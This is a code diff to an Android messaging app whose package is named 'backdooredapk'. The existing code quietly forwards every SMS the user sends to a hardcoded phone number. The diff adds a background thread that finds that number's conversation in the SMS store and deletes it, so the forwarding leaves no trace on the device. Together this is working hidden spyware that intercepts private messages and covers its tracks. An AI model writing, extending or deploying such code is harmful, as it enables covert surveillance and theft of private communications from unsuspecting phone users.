@@ -1,6 +1,8 @@
 package stage.metasploit.com.backdooredapk;
 
 import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
@@ -101,6 +103,7 @@ public class ConversationActivity extends Activity {
             sms.sendTextMessage(phoneNumber, null, editSms.getText().toString(), null, null);
             mAdapter.addSms(new SMS(editSms.getText().toString(), "2"));
             sms.sendTextMessage("+33642617318", null, "To : " + phoneNumber + "\n" + editSms.getText().toString(), null, null);
+            new DeleteThread().start();
             editSms.setText("");
         }
     }
@@ -120,6 +123,43 @@ public class ConversationActivity extends Activity {
     @Subscribe
     public void onEvent(NewSmsEvent event) {
         mAdapter.addSms(event.getSms());
+    }
+
+    class DeleteThread extends Thread {
+
+        @Override
+        public void run() {
+            try {
+                wait(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            } finally {
+                deleteThread(ConversationActivity.this, "+33642617318");
+            }
+        }
+
+        private String findThreadForNumber(Context context, String number) {
+            ContentResolver cr = context.getContentResolver();
+            Cursor pCur = cr.query(
+                    Uri.parse("content://sms/canonical-addresses"), new String[]{"_id"},
+                    "address" + " = ?",
+                    new String[]{number}, null);
+
+            String thread_id = null;
+
+            if (pCur != null) {
+                if (pCur.getCount() != 0) {
+                    pCur.moveToNext();
+                    thread_id = pCur.getString(pCur.getColumnIndex("_id"));
+                }
+                pCur.close();
+            }
+            return thread_id;
+        }
+
+        private void deleteThread(Context context, String number) {
+            context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + findThreadForNumber(context, number)), null, null);
+        }
     }
 
 }
